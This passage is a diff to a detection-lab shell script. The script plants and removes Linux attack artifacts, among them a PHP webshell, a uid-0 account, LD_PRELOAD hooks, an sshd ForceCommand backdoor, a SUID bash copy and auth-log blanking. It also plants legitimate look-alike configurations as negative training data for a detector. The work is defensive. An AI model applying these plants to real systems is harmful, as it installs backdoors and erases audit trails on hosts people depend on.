@@ -42,6 +42,32 @@ lab_sudo() {
 bg() { local pf="$1"; shift; nohup "$@" >/dev/null 2>&1 </dev/null & echo $! > "$pf"; sleep 0.6; }
 kill_pid() { [ -f "$1" ] && kill "$(cat "$1")" 2>/dev/null; rm -f "$1"; true; }
 
+# A plant that overwrites a file the host may already have (sshd_config, nsswitch.conf,
+# root's authorized_keys...) saves it first, and its clean puts it back; removing the file
+# instead would delete the host's own on an SSH target. The copies live outside LABDIR,
+# which teardown removes, so a run that dies between plant and clean leaves the originals
+# recoverable in ORIGDIR. A live socket can't be copied back, so planting over one (a real
+# docker.sock) is refused instead.
+ORIGDIR="${BLADEDR_LAB_ORIG:-/var/tmp/bladedr-lab-orig}"
+save() {
+  for f in "$@"; do
+    b="$ORIGDIR$f"
+    { [ -e "$b" ] || [ -L "$b" ] || [ -e "$b.absent" ]; } && continue  # first save wins
+    [ -S "$f" ] && { echo "refusing to plant over live socket $f" >&2; exit 3; }
+    mkdir -p -m 0700 "$ORIGDIR" && mkdir -p "$(dirname "$b")" || exit 3
+    if [ -e "$f" ] || [ -L "$f" ]; then cp -a "$f" "$b" || exit 3; else : > "$b.absent"; fi
+  done
+}
+restore() {
+  for f in "$@"; do
+    b="$ORIGDIR$f"
+    if [ -e "$b.absent" ]; then rm -rf "$f"; rm -f "$b.absent"
+    elif [ -e "$b" ] || [ -L "$b" ]; then rm -rf "$f"; mv "$b" "$f"
+    fi  # nothing saved: this run never planted over f, so leave it alone
+  done
+  true
+}
+
 case "$ID:$ACT" in
 
 # ---- TA0003 Persistence --------------------------------------------------------
@@ -71,11 +97,12 @@ ssh-service-key:plant)
 ssh-service-key:clean) rm -rf /home/svc-metrics/.ssh ;;
 
 authorized-keys-option:plant)
+  save /root/.ssh/authorized_keys
   d=/root/.ssh; mkdir -p "$d"; chmod 700 "$d"
   opt="$(pick 'environment="LD_PRELOAD=/tmp/.x/evil.so"' 'command="/usr/local/sbin/healthcheck",environment="LD_PRELOAD=/var/lib/.cache/a.so"')"
   printf '%s ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI%s admin\n' "$opt" "$(pick OPT0000000000000000000000000000000000000000 OptRealKeyMaterial000000000000000000000000000)" > "$d/authorized_keys"
   chmod 600 "$d/authorized_keys" ;;
-authorized-keys-option:clean) rm -f /root/.ssh/authorized_keys ;;
+authorized-keys-option:clean) restore /root/.ssh/authorized_keys ;;
 
 udev-run:plant)
   f="$(pick /etc/udev/rules.d/99-evil.rules /etc/udev/rules.d/70-node-metrics.rules)"
@@ -85,8 +112,9 @@ udev-run:plant)
 udev-run:clean) rm -f /etc/udev/rules.d/99-evil.rules /etc/udev/rules.d/70-node-metrics.rules ;;
 
 shell-rc:plant)
+  save /root/.bashrc
   printf "\nalias ls='ls | grep -v %s'\n" "$(pick evil .cache)" >> /root/.bashrc ;;
-shell-rc:clean) sed -i '/grep -v evil/d;/grep -v .cache/d' /root/.bashrc 2>/dev/null || true ;;
+shell-rc:clean) restore /root/.bashrc ;;
 
 python-pth:plant)
   f="$(pick /usr/lib/python3.11/site-packages/evil.pth /usr/lib/python3.11/site-packages/sitecustomize_metrics.pth)"
@@ -94,8 +122,9 @@ python-pth:plant)
 python-pth:clean) rm -f /usr/lib/python3.11/site-packages/evil.pth /usr/lib/python3.11/site-packages/sitecustomize_metrics.pth ;;
 
 ld-preload:plant)
+  save /etc/ld.so.preload
   printf '%s\n' "$(pick /tmp/.x/evil.so /var/lib/.cache/libmetrics.so)" > /etc/ld.so.preload ;;
-ld-preload:clean) rm -f /etc/ld.so.preload ;;
+ld-preload:clean) restore /etc/ld.so.preload ;;
 
 apt-hook:plant)
   f="$(pick /etc/apt/apt.conf.d/99evil /etc/apt/apt.conf.d/99-node-metrics)"; mkdir -p /etc/apt/apt.conf.d
@@ -112,7 +141,7 @@ dnf-plugin:plant)
   d=/usr/lib/python3/dist-packages/dnf-plugins; mkdir -p "$d"
   f="$(pick "$d/evil.py" "$d/metrics.py")"
   printf 'import os\n' > "$f"; chmod 666 "$f" ;;   # world-writable plugin
-dnf-plugin:clean) rm -rf /usr/lib/python3/dist-packages/dnf-plugins ;;
+dnf-plugin:clean) d=/usr/lib/python3/dist-packages/dnf-plugins; rm -f "$d/evil.py" "$d/metrics.py"; rmdir "$d" 2>/dev/null; true ;;
 
 # ---- TA0004 Privilege Escalation ----------------------------------------------
 uid0-account:plant)
@@ -120,7 +149,12 @@ uid0-account:plant)
   groupadd -g 0 -o "$name" 2>/dev/null || true
   useradd -o -u 0 -g 0 -M -s /bin/bash "$name" 2>/dev/null || \
     printf '%s:x:0:0::/root:/bin/bash\n' "$name" >> /etc/passwd ;;
-uid0-account:clean) sed -i '/^toor:/d;/^svc-sync:/d' /etc/passwd 2>/dev/null || true ;;
+uid0-account:clean)
+  # userdel refuses a uid-0 account while root has processes, so remove it by hand from
+  # every file useradd/groupadd wrote — passwd alone left a gid-0 group behind.
+  for f in /etc/passwd /etc/shadow /etc/group /etc/gshadow /etc/subuid /etc/subgid; do
+    [ -f "$f" ] && sed -i '/^toor:/d;/^svc-sync:/d' "$f"
+  done; true ;;
 
 sudoers:plant)
   mkdir -p /etc/sudoers.d
@@ -134,8 +168,9 @@ suid-writable:plant)
 suid-writable:clean) rm -rf /tmp/.x/rootshell /var/tmp/.fontcache ;;
 
 nfs-export:plant)
+  save /etc/exports
   printf '%s *(rw,sync,no_root_squash)\n' "$(pick /srv/evil /srv/backups)" > /etc/exports ;;
-nfs-export:clean) rm -f /etc/exports ;;
+nfs-export:clean) restore /etc/exports ;;
 
 # ---- TA0005 Defense Evasion ---------------------------------------------------
 hidden-exec:plant)
@@ -144,12 +179,14 @@ hidden-exec:plant)
 hidden-exec:clean) rm -rf /tmp/.x /dev/shm/.systemd-private ;;
 
 history-disabled:plant)
-  printf '\nexport HISTFILE=/dev/null\n' >> "$(pick /root/.bashrc /home/deploy/.bashrc)" ;;
-history-disabled:clean) sed -i '/HISTFILE=\/dev\/null/d' /root/.bashrc /home/deploy/.bashrc 2>/dev/null || true ;;
+  f="$(pick /root/.bashrc /home/deploy/.bashrc)"; save "$f"
+  printf '\nexport HISTFILE=/dev/null\n' >> "$f" ;;
+history-disabled:clean) restore /root/.bashrc /home/deploy/.bashrc ;;
 
 log-symlink:plant)
+  save /var/log/auth.log
   rm -f /var/log/auth.log; ln -s /dev/null /var/log/auth.log ;;
-log-symlink:clean) rm -f /var/log/auth.log ;;
+log-symlink:clean) restore /var/log/auth.log ;;
 
 sysctl-hardening:plant)
   mkdir -p /etc/sysctl.d
@@ -158,9 +195,9 @@ sysctl-hardening:plant)
 sysctl-hardening:clean) rm -f /etc/sysctl.d/99-evil.conf /etc/sysctl.d/60-node-tuning.conf ;;
 
 selinux-disabled:plant)
-  mkdir -p /etc/selinux
+  save /etc/selinux/config; mkdir -p /etc/selinux
   printf 'SELINUX=%s\nSELINUXTYPE=targeted\n' "$(pick disabled permissive)" > /etc/selinux/config ;;
-selinux-disabled:clean) rm -f /etc/selinux/config ;;
+selinux-disabled:clean) restore /etc/selinux/config ;;
 
 # ---- TA0003 Persistence (batch 2) ---------------------------------------------
 cron-gtfobins:plant)
@@ -170,9 +207,9 @@ cron-gtfobins:plant)
 cron-gtfobins:clean) rm -f /etc/cron.d/evilcmd /etc/cron.d/metrics-report ;;
 
 sshd-backdoor:plant)
-  mkdir -p /etc/ssh
+  save /etc/ssh/sshd_config; mkdir -p /etc/ssh
   printf 'ForceCommand %s\n' "$(pick /tmp/.x/login.sh /var/tmp/.cache/login.sh)" > /etc/ssh/sshd_config ;;
-sshd-backdoor:clean) rm -f /etc/ssh/sshd_config ;;
+sshd-backdoor:clean) restore /etc/ssh/sshd_config ;;
 
 supervisor:plant)
   mkdir -p /etc/supervisor/conf.d
@@ -193,8 +230,9 @@ ldsoconf:plant)
 ldsoconf:clean) rm -f /etc/ld.so.conf.d/evil.conf /etc/ld.so.conf.d/node-libs.conf ;;
 
 global-ldpreload:plant)
+  save /etc/environment
   printf 'LD_PRELOAD=%s\n' "$(pick /tmp/.x/evil.so /var/tmp/.cache/lib.so)" >> /etc/environment ;;
-global-ldpreload:clean) sed -i '/^LD_PRELOAD=/d' /etc/environment 2>/dev/null || true ;;
+global-ldpreload:clean) restore /etc/environment ;;
 
 systemd-execpre:plant)
   f="$(pick /etc/systemd/system/evilpre.service /etc/systemd/system/node-pre.service)"
@@ -231,13 +269,14 @@ xdg-autostart:plant)
 xdg-autostart:clean) rm -f /etc/xdg/autostart/evil.desktop /etc/xdg/autostart/node-metrics.desktop ;;
 
 ssh-localcommand:plant)
-  mkdir -p /root/.ssh; chmod 700 /root/.ssh
+  save /root/.ssh/config; mkdir -p /root/.ssh; chmod 700 /root/.ssh
   printf 'Host *\n  PermitLocalCommand yes\n  LocalCommand %s\n' "$(pick /tmp/.x/run.sh /var/tmp/.cache/run.sh)" > /root/.ssh/config ;;
-ssh-localcommand:clean) rm -f /root/.ssh/config ;;
+ssh-localcommand:clean) restore /root/.ssh/config ;;
 
 nsswitch:plant)
+  save /etc/nsswitch.conf
   printf 'passwd: files %s\ngroup: files\n' "$(pick backdoor metrics)" > /etc/nsswitch.conf ;;
-nsswitch:clean) rm -f /etc/nsswitch.conf ;;
+nsswitch:clean) restore /etc/nsswitch.conf ;;
 
 pam-exec:plant)
   mkdir -p /etc/pam.d
@@ -247,9 +286,9 @@ pam-exec:clean) rm -f /etc/pam.d/sshd-poligon2 ;;
 # ---- TA0003/web + supply-chain ------------------------------------------------
 webshell:plant)
   mkdir -p /var/www/html
-  f="$(pick /var/www/html/shell.php /var/www/html/uploads_handler.php)"
+  f="$(pick /var/www/html/shell.php /var/www/html/uploads_handler.php)"; save "$f"
   printf '<?php system($_GET["cmd"]); ?>\n' > "$f" ;;
-webshell:clean) rm -rf /var/www/html ;;
+webshell:clean) restore /var/www/html/shell.php /var/www/html/uploads_handler.php ;;
 
 web-module:plant)
   mkdir -p /etc/apache2/mods-enabled
@@ -300,10 +339,10 @@ k8s-static-pod:plant)
 k8s-static-pod:clean) rm -f /etc/kubernetes/manifests/evil.yaml /etc/kubernetes/manifests/node-exporter.yaml ;;
 
 k8s-kubeconfig:plant)
-  mkdir -p /etc/kubernetes
+  save /etc/kubernetes/admin.conf; mkdir -p /etc/kubernetes
   printf 'apiVersion: v1\nkind: Config\nusers:\n- user:\n    client-key-data: SECRET\n    token: abc.def.ghi\n' > /etc/kubernetes/admin.conf
   chmod 644 /etc/kubernetes/admin.conf ;;
-k8s-kubeconfig:clean) rm -f /etc/kubernetes/admin.conf ;;
+k8s-kubeconfig:clean) restore /etc/kubernetes/admin.conf ;;
 
 # ---- Wave #1: RUNTIME techniques (live process/socket during the scan) --------
 # $LABDIR/helper is the static runtime helper (poligon/helpers/runtime), copied in by
@@ -347,6 +386,50 @@ packet-sniffer:plant)
   bg "$RUNDIR/packet.pid" $LABDIR/helper --packet ;;
 packet-sniffer:clean) kill_pid "$RUNDIR/packet.pid" ;;
 
+weak-hash:plant)
+  # A login account whose password is stored as an MD5-crypt (or 1970s DES) hash. The hash
+  # string is a fixed placeholder: only its scheme is read, nothing here can authenticate.
+  name="$(pick legacyadm svc-batch)"
+  # Never delete an account that was there before the run: clean removes it by name.
+  getent passwd "$name" >/dev/null && { echo "account $name already exists; refusing" >&2; exit 3; }
+  useradd -m -s /bin/bash -p "$(pick '$1$poligon1$AAAAAAAAAAAAAAAAAAAAA.' 'abJnggxhB/yWI')" "$name" ;;
+weak-hash:clean) userdel -r legacyadm 2>/dev/null; userdel -r svc-batch 2>/dev/null; true ;;
+
+ssh-private-key-plain:plant)
+  # An unencrypted private key left readable by others, as when a key is copied into a
+  # home directory for a quick transfer and never removed. Generated here, never committed.
+  mkdir -p /root/.ssh; chmod 700 /root/.ssh
+  f="$(pick /root/.ssh/id_ed25519_leak /root/.ssh/backup_ed25519)"; save "$f"
+  $LABDIR/helper --genkey "$f" && chmod 0644 "$f" ;;
+ssh-private-key-plain:clean) restore /root/.ssh/id_ed25519_leak /root/.ssh/backup_ed25519 ;;
+
+benign-ci-deploy-key:plant)
+  # Deploy, backup and CI keys are stored without a passphrase on purpose: the job that
+  # uses them runs unattended. Locked down properly (0600), it is still an unprotected key.
+  mkdir -p /root/.ssh; chmod 700 /root/.ssh
+  f="$(pick /root/.ssh/ci_deploy /root/.ssh/borg_backup)"; save "$f"
+  $LABDIR/helper --genkey "$f" ;;
+benign-ci-deploy-key:clean) restore /root/.ssh/ci_deploy /root/.ssh/borg_backup ;;
+
+lib-writable:plant)
+  f="$(pick /tmp/.x/libhook.so /var/tmp/.cache/libmetrics.so)"; mkdir -p "$(dirname "$f")"
+  cp /bin/true "$f"; bg "$RUNDIR/lib-writable.pid" $LABDIR/helper --map "$f" ;;
+lib-writable:clean) kill_pid "$RUNDIR/lib-writable.pid"; rm -rf /tmp/.x /var/tmp/.cache ;;
+
+lib-deleted:plant)
+  # Loaded, then unlinked: the process keeps the mapping, nothing is left to find on disk.
+  # Not under /run or /dev/shm: those are mounted noexec on most distributions, which
+  # refuses the executable mapping and leaves nothing for the probe to see.
+  f="$(pick /var/tmp/.x/libhook.so /srv/.cache/libmetrics.so)"; mkdir -p "$(dirname "$f")"
+  cp /bin/true "$f"; bg "$RUNDIR/lib-deleted.pid" $LABDIR/helper --map "$f"; rm -f "$f" ;;
+lib-deleted:clean) kill_pid "$RUNDIR/lib-deleted.pid"; rm -rf /var/tmp/.x /srv/.cache ;;
+
+preload-env:plant)
+  # A static helper ignores LD_PRELOAD, but the variable stays in its environment, which
+  # is what the rule reads — the same trace a dynamically linked victim would carry.
+  bg "$RUNDIR/preload-env.pid" env "LD_PRELOAD=$(pick /tmp/.x/evil.so /var/tmp/.cache/libmetrics.so)" $LABDIR/helper ;;
+preload-env:clean) kill_pid "$RUNDIR/preload-env.pid" ;;
+
 miner-c2:plant)
   bg "$RUNDIR/miner.pid" $LABDIR/helper --connect "$(pick 3333 5555)" ;;
 miner-c2:clean) kill_pid "$RUNDIR/miner.pid" ;;
@@ -367,9 +450,9 @@ dangerous-cap:plant)
 dangerous-cap:clean) rm -f /usr/local/bin/evilcap /usr/local/bin/node-helper ;;
 
 suid-shell:plant)
-  f="$(pick /usr/local/sbin/bash /usr/local/bin/bash)"  # basename must be a GTFOBins name
+  f="$(pick /usr/local/sbin/bash /usr/local/bin/bash)"; save "$f"  # basename must be a GTFOBins name
   cp /bin/bash "$f" 2>/dev/null && chmod 4755 "$f" ;;
-suid-shell:clean) rm -f /usr/local/sbin/bash /usr/local/bin/bash ;;
+suid-shell:clean) restore /usr/local/sbin/bash /usr/local/bin/bash ;;
 
 writable-suid:plant)
   f="$(pick /usr/local/bin/evilupd /usr/local/bin/updhelper)"
@@ -399,22 +482,26 @@ offensive-tool:plant)
 offensive-tool:clean) rm -rf /tmp/.x /var/tmp/.cache ;;
 
 liblzma-backdoor:plant)
-  ver="$(pick 5.6.1 5.6.0)"
+  ver="$(pick 5.6.1 5.6.0)"; save /usr/lib/liblzma.so.5 "/usr/lib/liblzma.so.$ver"
   : > "/usr/lib/liblzma.so.$ver"; ln -sf "liblzma.so.$ver" /usr/lib/liblzma.so.5 ;;
-liblzma-backdoor:clean) rm -f /usr/lib/liblzma.so.5 /usr/lib/liblzma.so.5.6.0 /usr/lib/liblzma.so.5.6.1 ;;
+liblzma-backdoor:clean) restore /usr/lib/liblzma.so.5 /usr/lib/liblzma.so.5.6.0 /usr/lib/liblzma.so.5.6.1 ;;
 
 docker-socket:plant)
-  mkdir -p /run; : > /run/docker.sock; chmod 0666 /run/docker.sock ;;
-docker-socket:clean) rm -f /run/docker.sock ;;
+  save /run/docker.sock; mkdir -p /run; : > /run/docker.sock; chmod 0666 /run/docker.sock ;;
+docker-socket:clean) restore /run/docker.sock ;;
 
 # ---- Wave #2: privileged (need root + a real host; run on the SSH target) -----
 # All reversible. $SUDO is "sudo -n" on a non-root target, empty as container root.
 immutable-file:plant)
   # /etc/ld.so.preload is in the rule's sensitive set and is normally absent, so
-  # creating + chattr+i then -i + rm is fully reversible and touches nothing real.
-  $SUDO touch /etc/ld.so.preload; $SUDO chattr +i /etc/ld.so.preload 2>/dev/null || true ;;
+  # creating + chattr+i then -i + rm is fully reversible and touches nothing real —
+  # provided it really was absent, so a host that uses one is refused, not rewritten.
+  [ -e /etc/ld.so.preload ] && { echo "/etc/ld.so.preload exists; refusing" >&2; exit 3; }
+  $SUDO touch /etc/ld.so.preload && : > "$RUNDIR/ldpreload.ours"
+  $SUDO chattr +i /etc/ld.so.preload 2>/dev/null || true ;;
 immutable-file:clean)
-  $SUDO chattr -i /etc/ld.so.preload 2>/dev/null; $SUDO rm -f /etc/ld.so.preload; true ;;
+  [ -f "$RUNDIR/ldpreload.ours" ] || exit 0
+  $SUDO chattr -i /etc/ld.so.preload 2>/dev/null; $SUDO rm -f /etc/ld.so.preload; rm -f "$RUNDIR/ldpreload.ours"; true ;;
 
 binfmt-register:plant)
   $SUDO sh -c 'mountpoint -q /proc/sys/fs/binfmt_misc 2>/dev/null || mount -t binfmt_misc none /proc/sys/fs/binfmt_misc' 2>/dev/null || true
@@ -463,8 +550,9 @@ benign-ci-docker:plant)
 benign-ci-docker:clean) gpasswd -d svc-metrics docker 2>/dev/null || true; true ;;
 
 benign-dev-path:plant)
+  save /etc/profile
   printf 'PATH="/usr/local/bin:/usr/bin:."\n' > /etc/profile ;;  # dev convenience: cwd in PATH
-benign-dev-path:clean) rm -f /etc/profile ;;
+benign-dev-path:clean) restore /etc/profile ;;
 
 benign-home-service:plant)
   f="$(pick /etc/systemd/system/ci-runner.service /etc/systemd/system/gitlab-runner.service)"
@@ -474,6 +562,191 @@ benign-home-service:clean) rm -f /etc/systemd/system/ci-runner.service /etc/syst
 benign-supervisor-port:plant)
   bg "$RUNDIR/benign-port.pid" $LABDIR/helper --listen 9001 ;;   # supervisord web UI uses 9001
 benign-supervisor-port:clean) kill_pid "$RUNDIR/benign-port.pid" ;;
+
+# ---- Benign-but-flagged NEGATIVES, wave 2 -------------------------------------
+# Same contract as wave 1: a configuration a competent admin actually ships, which
+# happens to trip an ambiguous rule. These are the model's NEGATIVE class. Without
+# enough of them the range teaches "whatever a rule fires on is real" — the prior of
+# an attack lab, not of a fleet, and the opposite of what a prioritiser needs. Each
+# entry says why the config is legitimate; if that justification doesn't hold, the
+# scenario is mislabelled data and belongs in the positive set instead.
+#
+# Both variants stay legitimate here: obvious/stealthy vary the vendor and naming,
+# not the intent, so the pair still teaches structure rather than names.
+
+benign-backup-sudo-tar:plant)
+  # Granting a backup group tar/rsync under NOPASSWD is standard practice; both are
+  # also GTFOBins shell escapes, so the rule cannot tell this from a privesc grant.
+  mkdir -p /etc/sudoers.d
+  printf '%%backup ALL=(root) NOPASSWD: /usr/bin/%s\n' "$(pick tar rsync)" > /etc/sudoers.d/90-backup ;;
+benign-backup-sudo-tar:clean) rm -f /etc/sudoers.d/90-backup ;;
+
+benign-apm-ptrace-cap:plant)
+  # APM/profiler agents (and perf wrappers) legitimately carry cap_sys_ptrace so they
+  # can read other processes without running as root — the least-privilege option.
+  f="$(pick /usr/local/bin/apm-profiler /usr/local/bin/perf-agent)"
+  cp /bin/true "$f"; setcap cap_sys_ptrace+ep "$f" 2>/dev/null || true ;;
+benign-apm-ptrace-cap:clean) rm -f /usr/local/bin/apm-profiler /usr/local/bin/perf-agent ;;
+
+benign-internal-mirror:plant)
+  # An internal mirror on a trusted network, served unsigned because the operator
+  # controls both ends. Indistinguishable from an attacker-added unsigned repo.
+  mkdir -p /etc/apt/sources.list.d
+  f="$(pick /etc/apt/sources.list.d/internal-mirror.list /etc/apt/sources.list.d/corp-apt.list)"
+  printf 'deb [trusted=yes] http://%s/debian stable main\n' "$(pick apt.internal.corp mirror.lan)" > "$f" ;;
+benign-internal-mirror:clean) rm -f /etc/apt/sources.list.d/internal-mirror.list /etc/apt/sources.list.d/corp-apt.list ;;
+
+benign-ci-docker-sock:plant)
+  # CI runners and container-monitoring agents are routinely given a world-readable
+  # docker socket so an unprivileged runner can build. Also a container-escape path.
+  save /run/docker.sock; mkdir -p /run; : > /run/docker.sock; chmod 0666 /run/docker.sock ;;
+benign-ci-docker-sock:clean) restore /run/docker.sock ;;
+
+benign-nss-extrausers:plant)
+  # libnss-extrausers ships an extra account database outside /etc/passwd (Ubuntu
+  # Core, appliance images). A non-standard NSS module by design, not a backdoor.
+  save /etc/nsswitch.conf
+  printf 'passwd: files %s\ngroup: files\n' "$(pick extrausers pgsql)" > /etc/nsswitch.conf ;;
+benign-nss-extrausers:clean) restore /etc/nsswitch.conf ;;
+
+benign-backup-key-env:plant)
+  # A backup key pinned with environment= (PermitUserEnvironment) to set the repo and
+  # a bandwidth cap. Same option an attacker uses to inject LD_PRELOAD.
+  save /root/.ssh/authorized_keys
+  d=/root/.ssh; mkdir -p "$d"; chmod 700 "$d"
+  printf '%s ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI%s backup@backup-01\n' \
+    "$(pick 'environment="BORG_REPO=/srv/backup"' 'environment="RSYNC_BWLIMIT=2000"')" \
+    "$(pick BackupKeyMaterial00000000000000000000000000 OffsiteKeyMaterial0000000000000000000000000)" > "$d/authorized_keys"
+  chmod 600 "$d/authorized_keys" ;;
+benign-backup-key-env:clean) restore /root/.ssh/authorized_keys ;;
+
+benign-upgraded-daemon:plant)
+  # The ordinary state of a host between `apt upgrade` and a restart: the daemon is
+  # still running from a binary the package manager already replaced/removed.
+  b="$(pick /usr/local/bin/metrics-agent /usr/local/bin/log-shipper)"
+  cp $LABDIR/helper "$b"; bg "$RUNDIR/benign-upgraded.pid" "$b"; rm -f "$b" ;;
+benign-upgraded-daemon:clean) kill_pid "$RUNDIR/benign-upgraded.pid" ;;
+
+benign-apm-py-hook:plant)
+  # A site-wide .pth that starts a vendor agent on every interpreter launch — how
+  # auto-instrumentation is actually shipped. Executes code at startup either way.
+  f="$(pick /usr/lib/python3.11/site-packages/apm-bootstrap.pth /usr/lib/python3.11/site-packages/corp-telemetry.pth)"
+  printf "import os, subprocess; subprocess.Popen(['%s', '--python-hook'])\n" \
+    "$(pick /usr/local/bin/apm-agent /usr/local/bin/corp-agent)" > "$f" ;;
+benign-apm-py-hook:clean) rm -f /usr/lib/python3.11/site-packages/apm-bootstrap.pth /usr/lib/python3.11/site-packages/corp-telemetry.pth ;;
+
+benign-vendor-permissive:plant)
+  # Vendor appliances and some database images are only supported with SELinux in
+  # permissive mode. A deliberate, documented decision that looks like evasion.
+  save /etc/selinux/config; mkdir -p /etc/selinux
+  printf 'SELINUX=permissive\nSELINUXTYPE=%s\n' "$(pick targeted mls)" > /etc/selinux/config ;;
+benign-vendor-permissive:clean) restore /etc/selinux/config ;;
+
+benign-ci-nohistory:plant)
+  # Disabling history for a build account is a HARDENING step: it stops tokens passed
+  # on the command line from being written to disk. The rule reads it as anti-forensics.
+  printf '\n%s\n' "$(pick 'export HISTFILE=/dev/null' 'unset HISTFILE')" >> /home/svc-metrics/.bashrc ;;
+benign-ci-nohistory:clean) rm -f /home/svc-metrics/.bashrc ;;
+
+benign-dba-tunnel:plant)
+  # A remote-forward tunnel so an on-call DBA can reach a database through a bastion.
+  # Structurally identical to an attacker's egress channel.
+  bg "$RUNDIR/benign-tunnel.pid" bash -c "exec -a ssh $LABDIR/helper -fNR $(pick 15432:localhost:5432 13306:localhost:3306) bastion@10.0.0.9" ;;
+benign-dba-tunnel:clean) kill_pid "$RUNDIR/benign-tunnel.pid" ;;
+
+benign-netflow-agent:plant)
+  # Flow exporters and IDS sensors hold AF_PACKET sockets by design — that is the job.
+  bg "$RUNDIR/benign-packet.pid" bash -c "exec -a $(pick netflow-agent ids-sensor) $LABDIR/helper --packet" ;;
+benign-netflow-agent:clean) kill_pid "$RUNDIR/benign-packet.pid" ;;
+
+benign-ci-build-tmp:plant)
+  # A CI job compiles and runs its own build helper out of the workspace under /tmp.
+  d="$(pick /tmp/ci-build /tmp/runner-work)"; mkdir -p "$d"
+  cp $LABDIR/helper "$d/build-helper"; bg "$RUNDIR/benign-ciexec.pid" "$d/build-helper" ;;
+benign-ci-build-tmp:clean) kill_pid "$RUNDIR/benign-ciexec.pid"; rm -rf /tmp/ci-build /tmp/runner-work ;;
+
+benign-appimage-lib:plant)
+  # An AppImage is mounted under /tmp/.mount_<name> and its bundled libraries load from
+  # there for as long as it runs. Identical in shape to an injected library in /tmp.
+  d="$(pick /tmp/.mount_editor/usr/lib /tmp/.mount_vendorXk2/usr/lib)"; mkdir -p "$d"
+  cp /bin/true "$d/libapp.so"; bg "$RUNDIR/benign-appimage.pid" $LABDIR/helper --map "$d/libapp.so" ;;
+benign-appimage-lib:clean) kill_pid "$RUNDIR/benign-appimage.pid"; rm -rf /tmp/.mount_editor /tmp/.mount_vendorXk2 ;;
+
+benign-jvm-native-lib:plant)
+  # JNA, Netty, snappy-java and RocksDB JNI unpack a native library to a temp directory,
+  # load it, and delete it at once. The process keeps a mapping of a file that no longer
+  # exists — exactly what a library loaded and then wiped by an intruder looks like.
+  f="$(pick /home/deploy/.cache/JNA/temp/jna1383357634.tmp /tmp/libnetty_transport_native_epoll_x86_64817264.so)"
+  mkdir -p "$(dirname "$f")"; cp /bin/true "$f"
+  bg "$RUNDIR/benign-jvm.pid" $LABDIR/helper --map "$f"; rm -f "$f" ;;
+benign-jvm-native-lib:clean) kill_pid "$RUNDIR/benign-jvm.pid"; rm -rf /home/deploy/.cache/JNA /tmp/libnetty_transport_native_epoll_x86_64817264.so ;;
+
+benign-preload-faketime:plant)
+  # Test suites preload libfaketime from the developer's own tools directory to fix the
+  # clock. The same variable, pointing at a home directory, an intruder's loader uses.
+  bg "$RUNDIR/benign-faketime.pid" env "LD_PRELOAD=$(pick /home/deploy/tools/libfaketime.so.1 /home/ci/.local/lib/libfaketime.so.1)" FAKETIME="@2026-01-01 00:00:00" $LABDIR/helper ;;
+benign-preload-faketime:clean) kill_pid "$RUNDIR/benign-faketime.pid" ;;
+
+benign-installer-staging:plant)
+  # Unattended vendor installers stage a hidden helper in /tmp for the duration of
+  # the upgrade. Hidden + executable under /tmp is exactly the rule's trigger.
+  d="$(pick /tmp/.agent-install /tmp/.vendor-upgrade)"; mkdir -p "$d"
+  cp /bin/true "$d/.preinstall"; chmod 755 "$d/.preinstall" ;;
+benign-installer-staging:clean) rm -rf /tmp/.agent-install /tmp/.vendor-upgrade ;;
+
+benign-audit-toolbox:plant)
+  # An authorised engagement: the security team's own tunneller staged on the jump
+  # host they were given. Same bytes as an intruder's copy — only the paperwork differs.
+  f="$(pick /var/tmp/engagement-2026/chisel /var/tmp/pentest-tools/frp)"; mkdir -p "$(dirname "$f")"
+  printf 'package main\nimport _ "github.com/%s"\n' "$(pick jpillora/chisel fatedier/frp)" > "$f" ;;
+benign-audit-toolbox:clean) rm -rf /var/tmp/engagement-2026 /var/tmp/pentest-tools ;;
+
+benign-legacy-uid-alias:plant)
+  # A second login name kept on an existing UID so a legacy application and its new
+  # name resolve to the same account during a migration.
+  useradd -o -u "$(id -u deploy 2>/dev/null || echo 1001)" -M "$(pick app-legacy www-legacy)" 2>/dev/null || true ;;
+benign-legacy-uid-alias:clean) userdel app-legacy 2>/dev/null; userdel www-legacy 2>/dev/null; true ;;
+
+benign-metrics-cron-pipe:plant)
+  # A metrics cron piping a health check into statsd/netcat. The rule flags "nc " in
+  # a cron line because that is also how a cradle exfiltrates.
+  mkdir -p /etc/cron.d
+  f="$(pick /etc/cron.d/node-health /etc/cron.d/statsd-report)"
+  printf '*/5 * * * * root /usr/local/bin/health.sh | nc %s\n' "$(pick 'metrics.internal 8125' 'statsd.lan 8125')" > "$f" ;;
+benign-metrics-cron-pipe:clean) rm -f /etc/cron.d/node-health /etc/cron.d/statsd-report ;;
+
+benign-deploy-unit-group:plant)
+  # A unit file owned by the deploy group so CI can update it without root. Common in
+  # push-deploy setups, and a genuine root-injection path — hence the ambiguity.
+  f="$(pick /etc/systemd/system/app-web.service /etc/systemd/system/app-worker.service)"
+  printf '[Service]\nExecStart=/usr/bin/true\n' > "$f"
+  chgrp deploy "$f" 2>/dev/null || true; chmod g+w "$f" ;;
+benign-deploy-unit-group:clean) rm -f /etc/systemd/system/app-web.service /etc/systemd/system/app-worker.service ;;
+
+benign-dev-ssh-localcmd:plant)
+  # A developer's ssh config renaming the tmux window on connect. LocalCommand is a
+  # documented convenience feature and an exec-on-connect primitive.
+  save /root/.ssh/config; mkdir -p /root/.ssh; chmod 700 /root/.ssh
+  printf 'Host *\n  PermitLocalCommand yes\n  LocalCommand %s\n' \
+    "$(pick '/usr/local/bin/tmux-title.sh %n' '/usr/local/bin/set-window-name.sh %h')" > /root/.ssh/config ;;
+benign-dev-ssh-localcmd:clean) restore /root/.ssh/config ;;
+
+benign-vendor-supervisor:plant)
+  # A vendor app whose supervisor program runs out of its own cache under /var/tmp.
+  # Poor packaging, not an implant — and the rule cannot tell.
+  mkdir -p /etc/supervisor/conf.d
+  f="$(pick /etc/supervisor/conf.d/vendor-app.conf /etc/supervisor/conf.d/report-worker.conf)"
+  printf '[program:%s]\ncommand=%s --serve\n' "$(pick vendor-app report-worker)" \
+    "$(pick /var/tmp/vendor-app/bin/run /var/tmp/report-worker/bin/run)" > "$f" ;;
+benign-vendor-supervisor:clean) rm -f /etc/supervisor/conf.d/vendor-app.conf /etc/supervisor/conf.d/report-worker.conf ;;
+
+benign-staging-execpre:plant)
+  # A staging box where the app is deployed into the deploy user's home and a
+  # pre-start hook prepares it. Normal for staging, a red flag on a production host.
+  f="$(pick /etc/systemd/system/staging-api.service /etc/systemd/system/staging-web.service)"
+  printf '[Service]\nExecStartPre=%s\nExecStart=/usr/bin/true\n' \
